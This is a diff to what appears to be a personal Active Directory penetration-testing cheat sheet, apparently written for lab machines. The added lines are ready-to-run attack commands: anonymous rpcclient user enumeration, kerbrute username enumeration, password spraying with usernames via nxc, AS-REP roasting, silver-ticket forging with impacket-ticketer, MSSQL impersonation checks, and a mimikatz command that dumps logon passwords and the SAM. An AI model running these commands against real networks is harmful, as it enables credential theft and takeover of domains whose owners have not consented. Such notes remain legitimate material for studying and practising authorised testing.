@@ -8,7 +8,17 @@
 6. SharpHound.ps1 ingestion
 7. No credentials? Try to enumerate as much as possible using LDAP
 	
- 	a. kerbrute userenum --dc dc.domain.com -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+ 			a. kerbrute userenum --dc dc.domain.com -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+   			b. rpcclient -U '' -N <ip>
+			   enumdomusers
+		     	   querydispinfo
+
+   			c. rpcclient -U "" <ip> -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > userlist.txt
+
+8. brute force usernames as passwords
+
+			a. nxc smb <ip> -u usernames.txt -p usernames.txt
 
 
 ```
@@ -24,6 +34,8 @@ sudo impacket-GetUserSPNs -request -dc-ip <DC-IP> domain.local/<valid-username>:
 
 impacket-GetNPUsers corp.com/ -dc-ip 192.168.180.70 -format hashcat -usersfile users.txt
 impacket-GetNPUsers corp.com/dave -dc-ip 192.168.180.70 -format hashcat >> hash.test
+
+nxc ldap <ip> -u user.txt -p '' --asreproast
 
 . .\PowerView.ps1
       Get-NetGroup "Domain Admins" | select member
@@ -51,6 +63,29 @@ impacket-GetNPUsers corp.com/dave -dc-ip 192.168.180.70 -format hashcat >> hash.
       MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
       
 ```
+
+**Alternative ways to use credentials**
+
+```
+[Check for user descriptions using LDAP]
+nxc ldap <ip> -u 'username' -p 'password' --query "(objectClass=*)" "*"
+
+[ingest for BloodHound using nxc]
+nxc ldap <ip> -u user -p pass --bloodhound -c All -ns <ip>
+
+[if the account is a service account, craft a silver ticket]
+impacket-ticketer -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
+KRB5CCNAME=administrator.ccache impacket-mssqlclient -k USER@dc.sequel.htb
+
+[use access to MSSQL server to check for impersonation privileges]
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
+[if an Administrator, dump the local SAM and LSA using secretsdump or mimikatz]
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
+
+```
+
+
 
 **Passing the Hash**
 
